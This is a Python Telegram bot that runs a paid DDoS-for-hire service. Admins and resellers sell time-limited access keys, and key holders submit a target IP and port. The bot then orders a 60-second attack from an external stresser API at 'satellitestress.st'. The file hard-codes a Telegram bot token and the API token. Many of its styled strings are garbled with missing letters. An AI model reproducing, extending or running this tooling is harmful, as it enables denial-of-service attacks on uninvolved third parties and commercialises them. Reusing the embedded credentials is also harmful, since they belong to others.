import os
import json
import time
import random
import string
import telebot
import datetime
import calendar
import subprocess
import threading
import logging
import requests
from telebot import types
from dateutil.relativedelta import relativedelta

# Insert your Telegram bot token here
bot = telebot.TeleBot('7072312985:AAHgR5Lc87DxZANKH2cIeXCgd1PuSInMYD0')

# Admin user IDs
admin_id = {"6768273586", "2007860433"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
BOT_LINK = "@MRiN_DiLDOS_bot"
escaped_bot_link = BOT_LINK.replace('_', '\\_')

# Per key cost for resellers
KEY_COST = {"1hour": 30, "1day": 150, "7days": 450, "1month": 1100}

# API Configuration
BASE_URL = "https://satellitestress.st"
LOGIN_URL = f"{BASE_URL}/login"
ATTACK_URL = f"{BASE_URL}/attack"
API_TOKEN = "25fd271b3ea106a629160f0bf606032aeaa7672b5caf9ce9d3e3f1f0d3dfb58d"
FIXED_DURATION = 60  # Fixed attack duration in seconds

# Create a session to maintain cookies
session = requests.Session()

# In-memory storage
users = {}
keys = {}

# Read users and keys from files initially
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def create_random_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    custom_key = f"MoY-ViP-{random_key.upper()}"
    return custom_key

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time
            
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "No data found."
            else:
                file.truncate(0)
                return "➖ Logs cleared ✅"
    except FileNotFoundError:
        return "No data found."
        
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Load resellers and their balances from the JSON file
def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        return {}

# Save resellers and their balances to the JSON file
def save_resellers(resellers):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers, file, indent=4)

# Initialize resellers data
resellers = load_resellers()

# Login to Satellite Stress API
def login_to_api():
    """Authenticate with the API using the token"""
    try:
        # Try different login endpoints and methods
        login_methods = [
            # Method 1: POST to /login with token in JSON
            {
                "url": f"{BASE_URL}/login",
                "data": {"token": API_TOKEN},
                "method": "POST"
            },
            # Method 2: POST to /api/login
            {
                "url": f"{BASE_URL}/api/login",
                "data": {"token": API_TOKEN},
                "method": "POST"
            },
            # Method 3: GET with token parameter
            {
                "url": f"{BASE_URL}/login",
                "params": {"token": API_TOKEN},
                "method": "GET"
            }
        ]
        
        for method in login_methods:
            try:
                if method["method"] == "POST":
                    resp = session.post(method["url"], json=method.get("data"), timeout=10)
                else:
                    resp = session.get(method["url"], params=method.get("params"), timeout=10)
                
                if resp.status_code in [200, 302, 303]:
                    print(f"✓ Login successful via {method['url']}")
                    return True
            except Exception as e:
                continue
        
        print("✗ All login methods failed")
        return False
        
    except Exception as e:
        print(f"Login error: {e}")
        return False

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "‼️ 𝗢𝗹𝘆 𝗼𝗧 𝗢𝗪𝗲𝗥 𝗮𝗻 𝗿𝘂 𝗧𝗵𝗶𝘀 𝗖𝗺𝗺𝗻𝗱 ‼️")
        return

    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>")
        return

    broadcast_msg = command_parts[1]
    all_users = set(users.keys()) | set(resellers.keys()) | set(admin_id)  # Combine all user IDs

    sent_count = 0
    for user in all_users:
        try:
            bot.send_message(user, f"📢 *Broadcast Message :*\n\n{broadcast_msg}", parse_mode='Markdown')
            sent_count += 1
        except Exception as e:
            print(f"{e}")

    bot.reply_to(message, f"➖ Broadcast sent successfully to {sent_count} users ! ✅")


# Admin command to add a reseller
@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ 𝗢𝗹𝘆 𝗼𝗧 𝗢𝗪𝗲𝗥 𝗮𝗻 𝗿𝘂 𝗧𝗵𝗶𝘀 𝗖𝗺𝗺𝗻𝗱 ‼️")
        return

    # Command syntax: /addreseller <user_id> <initial_balance>
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "➖ 𝗨𝘀𝗮𝗴: /𝗮𝗱𝗱𝗥𝗲𝗲𝗹𝗹𝗲 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗯𝗹𝗮𝗻𝗰𝗲>")
        return

    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        bot.reply_to(message, "❗️𝗻𝗮𝗹𝗶𝗱 𝗯𝗮𝗮𝗻𝗰𝗲 𝗮𝗺𝗼𝘂𝘁️")
        return

    # Add reseller to the resellers.json
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        bot.reply_to(message, f"➖ *𝗲𝘀𝗹𝗹𝗲𝗿 𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝘀𝘀𝗳𝗹𝗹* ✅\n\n*𝗥𝗲𝗲𝗹𝗹𝗲 𝗨𝗲𝗿 𝗜𝗗* : {reseller_id}\n*𝗕𝗮𝗹𝗮𝗻𝗲* : {initial_balance} *Rs*\n\n⚡ *𝗢𝗪𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧 :* ⚡\n\n➖*𝗖𝗛𝗖𝗞 𝗬𝗢𝗨𝗥 𝗕𝗔𝗟𝗔𝗡𝗖𝗘*   :   `/balance` \n➖*𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗡𝗘 𝗞𝗘*   :   `/genkey`", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"➖ 𝗲𝗲𝗹𝗹𝗲 {reseller_id} 𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘁𝘀", parse_mode='Markdown')

# Reseller command to generate keys
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)

    # Syntax: /genkey <duration>
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "➖ *𝗨𝘀𝗴𝗲: /𝗴𝗲𝗻𝗲 <𝗱𝗿𝗮𝘁𝗶𝗼𝗻> \n\n⚙️ 𝙑𝙄𝙇𝘼𝘽𝙇𝙀 𝙆𝙀 '𝙨 & 𝘾𝙊𝙏 : \n 𝟭𝗼𝗿 : 𝟬 Rs \n➖ 𝟭𝗱𝗮𝘆 : 𝟭𝟱 Rs\n➖ 𝟳𝗱𝘆 : 𝟰𝟱𝟬 Rs\n➖ 𝟭𝗼𝗻𝗵 : 𝟭𝟬𝟬 Rs\n\n➖ 𝗫𝗠𝗣𝗟𝗘 : /𝗲𝗻𝗸𝗲𝘆  𝟭𝗺𝗼𝘁*", parse_mode='Markdown')
        return

    duration = command[1].lower()
    if duration not in KEY_COST:
        bot.reply_to(message, "*𝗜𝗻𝘃𝗹𝗶 𝗱𝘂𝗿𝘁𝗶𝗼𝗻*", parse_mode='Markdown')
        return

    cost = KEY_COST[duration]

    if user_id in admin_id:
        key = create_random_key()  # Generate the key using the renamed function
        keys[key] = {"duration": duration, "expiration_time": None}
        save_keys()
        response = f"➖ *𝗞𝗲𝘆 𝗴𝗻𝗲𝗿𝗮𝗲𝗱 𝘀𝘂𝗰𝗰𝘀𝘀𝗳𝘂𝗹* ✅\n\n*𝗞𝗲* : `{key}`\n*𝗗𝗿𝗮𝘁𝗶𝗼𝗻* : {duration}\n\n*𝗕𝗢 𝗟𝗶𝗞* : {escaped_bot_link}"

    elif user_id in resellers:
        if resellers[user_id] >= cost:
            resellers[user_id] -= cost
            save_resellers(resellers)

            key = create_random_key()  # Generate the key using the renamed function
            keys[key] = {"duration": duration, "expiration_time": None}
            save_keys()
            response = f"➖ *𝗞𝗲𝘆 𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝘀𝗰𝗰𝘀𝘀𝗳𝘂𝗹* ✅\n\n*𝗞𝗲* : `{key}`\n*𝗗𝗿𝗮𝘁𝗶𝗼𝗻* : {duration}\n𝗖𝗼𝘀𝘁: {cost} Rs\n𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 : {resellers[user_id]} Rs"
        else:
            response = f"❗️*𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗶𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗲 𝘁 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲* {duration} *𝗸𝗲𝘆*\n*𝗥𝗲𝗾𝘂𝗶𝗿𝗲 *: {cost} *Rs*\n*𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲* : {resellers[user_id]} Rs"
    else:
        response = "⛔️ *𝗔𝗰𝗲𝘀 𝗗𝗻𝗶𝗲𝗱 : 𝗔𝗱𝗺𝗶𝗻 𝗿 𝗥𝘀𝗲𝗹𝗹𝗲 𝗼𝗻𝘆 𝗰𝗼𝗺𝗺𝗮𝗱*"

    bot.reply_to(message, response, parse_mode='Markdown')

# Reseller command to check balance
@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)

    if user_id in resellers:
        current_balance = resellers[user_id]
        response = f"💰 *𝗬𝘂𝗿 𝗰𝘂𝗿𝗲𝗻𝘁 𝗯𝗹𝗮𝗰𝗲 𝗶𝘀* : {current_balance}."
    else:
        response = "⛔️ *𝗔𝗰𝗰𝘀𝘀 𝗗𝗲𝗶𝗲𝗱 : 𝗥𝗲𝘀𝗲𝗹𝗲 𝗼𝗻𝗹 𝗰𝗼𝗺𝗺𝗮𝗻*"

    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹 𝗕𝗼𝗧 𝗢𝗪𝗲 𝗖𝗻 𝗿𝘂𝗻 𝗵𝘀 𝗼𝗺𝗺𝗮𝗱* ‼️", parse_mode='Markdown')
        return

    try:
        help_text = """
⚡ *𝗣𝗢𝗪𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗡𝗧:* ⚡
🏦 `/addreseller <user_id> <balance>` - *Empower a new reseller!* 🔥
🔑 `/genkey <duration>` - *Craft a VIP key of destiny!* 🛠️
📜 `/logs` - *Unveil recent logs & secret records!* 📂
👥 `/users` - *Summon the roster of authorized warriors!* ⚔️
❌ `/remove <user_id>` - *Banish a user to the void!* 🚷
 `/resellers` - *Inspect the elite reseller ranks!* 🎖️
💰 `/addbalance <reseller_id> <amount>` - *Bestow wealth upon a reseller!* 💎
🗑️ `/removereseller <reseller_id>` - *Erase a reseller's existence!* ⚰️
"""
        bot.reply_to(message, help_text, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"{str(e)}", parse_mode='Markdown')


@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    bot.reply_to(message, "𝗣𝗲𝘀 𝘀𝗻𝗱 𝘆𝗼𝗿 𝗸𝗲𝘆:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()

    if key in keys:
        # Check if the user already has VIP access
        if user_id in users:
            current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < current_expiration:
                bot.reply_to(message, f"❕*𝗬𝗼 𝗮𝗹𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝘀𝘀*❕", parse_mode='Markdown')
                return
            else:
                del users[user_id]  # Remove expired access
                save_users()

        # Set the expiration time based on the key's duration
        duration = keys[key]["duration"]
        if duration == "1hour":
            expiration_time = add_time_to_current_date(hours=1)
        elif duration == "1day":
            expiration_time = add_time_to_current_date(days=1)
        elif duration == "7days":
            expiration_time = add_time_to_current_date(days=7)
        elif duration == "1month":
            expiration_time = add_time_to_current_date(months=1)  # Adding 1 month
        else:
            bot.reply_to(message, "Invalid duration in key.")
            return

        # Add user to the authorized list
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()

        # Remove the used key
        del keys[key]
        save_keys()

        bot.reply_to(message, f"➖ 𝗔𝗰𝗰𝘀𝘀 𝗴𝗿𝗻𝗲𝗱 !\n\n𝗲𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻: {users[user_id]}")
    else:
        bot.reply_to(message, "📛 𝗻𝗮𝗹𝗶𝗱 𝗼𝗿 𝗲𝗽𝗿𝗲𝗱 𝗸𝗲 📛")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found"
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "‼️ 𝗢𝗹 𝗕𝗼𝗧 𝗢𝗪𝗲 𝗖𝗻 𝗿𝗻 𝗵𝘀 𝗼𝗺𝗺𝗮𝗻 ‼️"
        bot.reply_to(message, response)

@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    markup.add(attack_button, myinfo_button, redeem_button)
    bot.reply_to(message, "𝗪𝗹𝗰𝗼𝗺𝗲 𝘁 *𝗠𝗥𝗶𝗡 𝘅 𝗶𝗗𝗢𝗦™* 𝗯𝗼𝘁!", reply_markup=markup)

def send_attack_finished_message(chat_id, target, port, time_val):
    """Notify the user that the attack is finished."""
    message = f"➖ 𝗔𝘁𝗮𝗰𝗸 𝗰𝗺𝗽𝗹𝗲𝘁𝗲 ! ✅\n\n𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗗𝗿𝗮𝘁𝗶𝗼𝗻: {time_val}s"
    try:
        bot.send_message(chat_id, message)
    except Exception as e:
        print(f"Failed to send finish message: {e}")

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)

    # Check if user has VIP access
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')

        # Check if the user's VIP access has expired
        if datetime.datetime.now() > expiration_date:
            response = "❗️𝗬𝘂 𝗮𝗰𝗲𝘀𝘀 𝗵𝘀 𝘅𝗶𝗲𝗱. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗵 𝗮𝗺𝗶 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄❗️"
            bot.reply_to(message, response)
            return

        # Prompt the user for attack details
        response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗲 𝗮𝗿𝗴𝗲 𝗶𝗽 𝗮𝗻𝗱 𝗽𝗼𝗿𝘁 𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝗽𝗮𝗰𝗲\n\n𝗙𝗶𝘅𝗱 𝗗𝘂𝗮𝗶𝗻: 60 seconds"
        bot.reply_to(message, response)
        bot.register_next_step_handler(message, process_attack_details)

    else:
        response = "⛔️ 𝗨𝗮𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝘀𝘀! ⛔️\n\n*Oops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!*"
        bot.reply_to(message, response)

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()

    if len(details) == 2:
        target = details[0]
        try:
            port = int(details[1])
            time_val = FIXED_DURATION  # Use fixed duration of 60 seconds
            
            # Record and log the attack
            record_command_logs(user_id, 'attack', target, port, time_val)
            log_command(user_id, target, port, time_val)
            
            username = message.chat.username or "No username"

            # First, login to get session cookies
            if not login_to_api():
                response = "❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗮𝘂𝘁𝗵𝗲𝗻𝘁𝗶𝗰𝗮𝗲 𝗶𝗵 𝗔𝗣𝗜"
                bot.reply_to(message, response)
                return

            # Prepare attack payload
            payload = {
                "ip": target,
                "port": port,
                "time": time_val
            }
            
            # Get CSRF token if needed (from login response or cookies)
            headers = {
                "Content-Type": "application/json",
                "Referer": BASE_URL
            }

            try:
                # Send attack request with authenticated session
                resp = session.post(ATTACK_URL, json=payload, headers=headers, timeout=10)
                
                if resp.status_code == 200:
                    response = f"🚀 𝗔𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝗰𝗲𝘀𝘂𝗹 ! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time_val} 𝘀𝗲𝗼𝗻𝗱\n𝗔𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
                    
                    # Start a timer to notify when finished
                    threading.Timer(time_val, send_attack_finished_message, [message.chat.id, target, port, time_val]).start()
                    
                else:
                    response = f"❌ 𝗔𝗣𝗜 𝗿𝗿𝗼𝗿: {resp.status_code}\n{resp.text}"
                    
            except Exception as e:
                response = f"❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁 𝗰𝗻𝗻𝗰 𝘁 𝗔𝗣: {str(e)}"

        except ValueError:
            response = "𝗜𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗳𝗼𝗿𝗺𝗮𝘁."
    else:
        response = "𝗜𝗻𝘃𝗹𝗶 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀: <𝗜> <𝗢𝗥𝗧>"
        
    bot.reply_to(message, response)
    
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"

    # Determine the user's role and additional information
    if user_id in admin_id:
        role = "Admin"
        key_expiration = "No access"
        balance = "Not Applicable"  # Admins don't have balances
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
        key_expiration = "No access"  # Resellers may not have key-based access
    elif user_id in users:
        role = "User"
        key_expiration = users[user_id]  # Fetch expiration directly
        balance = "Not Applicable"  # Regular users don't have balances
    else:
        role = "Guest"
        key_expiration = "No active key"
        balance = "Not Applicable"

    # Format the response
    response = (
        f"👤 𝗨𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢 👤\n\n"
        f"ℹ️ 𝗨𝗲𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝘀𝗿𝗜𝗗: {user_id}\n"
        f"🚹 𝗥𝗼𝗲: {role}\n"
        f"🕘 𝗘𝗽𝗶𝗮𝗶𝗼𝗻: {key_expiration}\n"
    )

    # Add balance info for resellers
    if role == "Reseller":
        response += f"💰 𝗨𝗥𝗥𝗘𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 : {balance}\n"

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)

    # Ensure only admins can use this command
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝘆 𝗕𝗼𝗧 𝗢𝗪𝗲 𝗖𝗻 𝗿𝗻 𝗧𝗵𝗶𝘀 𝗼𝗺𝗺𝗮𝗱* ‼️", parse_mode='Markdown')
        return

    if users:
        response = "➖ 𝘂𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗨𝘀𝗲𝗿 ✅\n\n"
        for user, expiration in users.items():
            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            response += f" *𝗨𝘀𝗿 𝗜𝗗 *: {user}\n *𝗘𝘅𝗶𝗲𝘀 𝗻* : {formatted_expiration}\n\n"
    else:
        response = "➖ 𝗡 𝗮𝘂𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝘀𝗲𝘀 𝗼𝗻𝗱."

    bot.reply_to(message, response, parse_mode='Markdown')
    
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)

    # Ensure only admins can use this command
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝘆 𝗕𝗼𝗧 𝗢𝗪𝗲 𝗖𝗻 𝗿𝗻 𝗵𝗶𝘀 𝗼𝗺𝗺𝗮𝗻* ‼️", parse_mode='Markdown')
        return

    # Extract the target User ID from the command
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝗨𝘀𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃 <𝗨𝗲𝗿_𝗜𝗗>")
        return

    target_user_id = command[1]

    if target_user_id in users:
        # Remove the user and save changes
        del users[target_user_id]
        save_users()
        response = f"➖ 𝘀𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲 𝘀𝘂𝗰𝗰𝘀𝘀𝘂𝗹 𝗿𝗲𝗺𝗼𝘃𝗱"
    else:
        response = f"➖ 𝘀𝗿 {target_user_id} 𝗶𝘀 𝗻𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝘂𝘁𝗼𝗿𝗶𝘇𝗲𝗱 𝘀𝗲𝗿 𝗹𝘀"

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    # Check if the user is an admin before displaying resellers' information
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝘆 𝗕𝗼𝗧 𝗢𝗪𝗲 𝗖𝗻 𝗿𝘂𝗻 𝗵𝗶𝘀 𝗼𝗺𝗺𝗮𝗻* ‼️", parse_mode='Markdown')
        return

    # Construct a message showing all resellers and their balances
    resellers_info = "➖ 𝗔𝘁𝗵𝗼𝗿𝗶𝘀𝗱 𝗥𝘀𝗲𝗹𝗹𝗲𝘀 ✅\n\n"
    if resellers:
        for reseller_id, balance in resellers.items():
            try:
                # Attempt to get the reseller's username
                reseller_chat = bot.get_chat(reseller_id)
                reseller_username = f"@{reseller_chat.username}" if reseller_chat.username else "Unknown"
            except Exception as e:
                # Handle cases where the chat cannot be found
                logging.error(f"Error fetching chat for reseller {reseller_id}: {e}")
                reseller_username = "Unknown (Chat not found)"

            # Add reseller details to the message
            resellers_info += (
                f"➖  𝗨𝘀𝗿𝗻𝗮𝗺𝗲 : {reseller_username}\n"
                f"➖  𝗨𝘀𝗿𝗜 : {reseller_id}\n"
                f"➖  𝗖𝗨𝗥𝗥𝗘𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 : {balance} Rs\n\n"
            )
    else:
        resellers_info += " ➖ 𝗡 𝗥𝗲𝘀𝗲𝗹𝗲𝗿 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲"

    # Send the resellers' information to the admin
    bot.reply_to(message, resellers_info)

       
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    # Check if the user is an admin
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        try:
            # Extract the reseller ID and amount from the message
            command_parts = message.text.split()
            if len(command_parts) != 3:
                bot.reply_to(message, "*𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗯𝗮𝗹𝗮𝗻𝗰𝗲 <𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿_𝗶𝗱> <𝗮𝗺𝗼𝘂𝗻𝘁>*", parse_mode='Markdown')
                return
            
            reseller_id = command_parts[1]
            amount = float(command_parts[2])
            
            # Check if the reseller exists
            if reseller_id not in resellers:
                bot.reply_to(message, "𝗥𝘀𝗲𝗹𝗹𝗲 𝗜 𝗻𝘁 𝗼𝗻𝗱")
                return
            
            # Add the balance to the reseller's account
            resellers[reseller_id] += amount
            bot.reply_to(message, f"✅ *𝗕𝗹𝗮𝗰𝗲 𝗦𝘂𝗰𝗲𝘀𝘀𝗳𝗹𝗹 𝗮𝗱𝗱𝗲𝗱 ✅\n\n𝗢𝗗 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 : {amount} Rs\n𝗥𝗘𝗘𝗟𝗟𝗘 𝗜𝗗 : {reseller_id}\n𝗖𝗨𝗥𝗥𝗘𝗧 𝗨𝗣𝗗𝗔𝗧𝗘𝗗 𝗕𝗔𝗟𝗔𝗡𝗘 : {resellers[reseller_id]} Rs*", parse_mode='Markdown')
            
        except ValueError:
            bot.reply_to(message, "𝗜𝗻𝘃𝗹𝗶 𝗮𝗺𝗼𝘂𝗻𝘁")
    else:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗲 𝗖𝗻 𝗿𝘂𝗻 𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻* ‼️", parse_mode='Markdown')
        
@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    # Check if the user is an admin
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        try:
            # Extract the reseller ID from the message
            command_parts = message.text.split()
            if len(command_parts) != 2:
                bot.reply_to(message, "*𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲𝗥𝗲𝗲𝗹𝗹𝗲𝗿 <𝗲𝘀𝗲𝗹𝗹𝗲𝗿_𝗱>*", parse_mode='Markdown')
                return
            
            reseller_id = command_parts[1]
            
            # Check if the reseller exists
            if reseller_id not in resellers:
                bot.reply_to(message, "*𝗥𝗲𝘀𝗲𝗹𝗲 𝗜 𝗻𝘁 𝗼𝗻𝗱.*", parse_mode='Markdown')
                return
            
            # Remove the reseller
            del resellers[reseller_id]
            bot.reply_to(message, f"*𝗥𝗲𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗵𝗮 𝗯𝗲 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝘀𝘀𝘂𝗹𝗹𝘆*", parse_mode='Markdown')
        
        except ValueError:
            bot.reply_to(message, "*𝗣𝗹𝗲𝗮𝗲 𝗽𝗿𝗼𝗶𝗱𝗲 𝗮 𝘃𝗹𝗶 𝗥𝘀𝗲𝗹𝗹𝗲𝗿 𝗗*")
    else:
        bot.reply_to(message, "‼ *𝗢𝗻𝗹𝘆 𝗼𝗧 𝗢𝗪𝗲 𝗖𝗻 𝘂 𝗧𝗵𝗶𝘀 𝗼𝗺𝗺𝗮𝗻 ‼*", parse_mode='Markdown')
    
if __name__ == "__main__":
    load_data()
    # Initial login attempt
    print("Attempting initial login to Satellite Stress API...")
    login_to_api()
    
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(1)
